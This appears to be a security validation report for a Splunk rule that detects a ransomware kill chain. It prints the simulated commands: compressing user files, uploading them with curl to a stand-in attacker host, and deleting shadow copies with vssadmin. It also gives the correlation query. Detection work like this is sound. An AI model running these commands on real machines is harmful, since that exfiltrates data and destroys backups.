# Validation Report: Correlation Rule - Ransomware Exfiltration

## General Information

* **Correlation Name:** Multi-Stage Attack: Ransomware Data Staging & Impact
* **Reference Rule:** `14-Correlation-Ransomware-Exfiltration.md`
* **Severity:** CRITICAL
* **Objective:** Detect the preparation, exfiltration, and destruction of backups typical of an active ransomware attack.

## The Attack Chain (Simulated Kill Chain)

The commands were executed in sequence (within 24 hours) to simulate the final script of a ransomware attack.

**Phase 1: Collection / Data Staging (Local File Compression)**

```cmd
7z.exe a -t7z C:\Temp\exfil_data.7z C:\Users\Public\Documents\*
```

**Phase 2: Exfiltration (Transfer to External Server)**

```cmd
curl.exe -F "file=@C:\Temp\exfil_data.7z" [http://attacker-server.com/upload](http://attacker-server.com/upload)
```

**Phase 3: Impact (Shadow Copies Destruction)**

```cmd
vssadmin.exe delete shadows /all /quiet
```

<img width="840" height="194" alt="Screenshot 2026-06-14 173643" src="https://github.com/user-attachments/assets/21ef1d3a-1a7c-4bcd-955b-110b1f260a98" />

---

## Expected Telemetry

1. `EventCode 4688` / `EventCode 1` for `7z.exe` or `WinRAR.exe`
2. `EventCode 4688` / `EventCode 1` for `curl.exe` or `rclone.exe`
3. `EventCode 4688` / `EventCode 1` for the string `vssadmin delete shadows`

## Correlated Splunk Query (SPL)

```SPL
(index=wineventlog OR index=sysmon) CommandLine=* 
(
  (EventCode=4688 OR EventCode=1) (CommandLine="*7z.exe*" OR CommandLine="*WinRAR.exe*")
) OR (
  (EventCode=4688 OR EventCode=1) (CommandLine="*rclone.exe*" OR CommandLine="*curl.exe*")
) OR (
  (EventCode=4688 OR EventCode=1) (CommandLine="*vssadmin*" CommandLine="*delete*" CommandLine="*shadows*")
)
| transaction host maxspan=24h
| search (CommandLine="*7z.exe*" OR CommandLine="*WinRAR.exe*") (CommandLine="*rclone.exe*" OR CommandLine="*curl.exe*") CommandLine="*vssadmin*" CommandLine="*delete*" CommandLine="*shadows*"
| eval Attack_Chain = "CRITICAL ATTACK: Data Compression -> Internet Exfiltration -> Shadow Copies Destruction"
| table _time, host, duration, Attack_Chain<img width="840" height="194" alt="Screenshot 2026-06-14 173643" src="https://github.com/user-attachments/assets/342fb98f-05ca-43a0-b81c-4e097539bcab" />

```

## Validation Result and Screenshot

The three destructive actions were successfully correlated into a single high-priority alert.

**Result:** `PASS`
